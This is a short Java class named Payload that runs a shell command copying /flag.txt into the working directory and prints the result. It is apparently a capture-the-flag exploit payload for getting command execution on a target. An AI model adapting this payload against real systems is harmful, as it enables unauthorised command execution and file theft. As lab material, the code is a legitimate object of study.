import java.io.*;
public class Payload {
	
	public static void main(String[] args){
		String command = "cp /flag.txt ./flag.txt";
		try {
		    Process process = Runtime.getRuntime().exec(command);
		    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
		    String line;
		    while ((line = reader.readLine()) != null) {
			System.out.println(line);
		    }
		 
		    reader.close();
		 
		} catch (IOException e) {
		    e.printStackTrace();
		}
	}
	
}
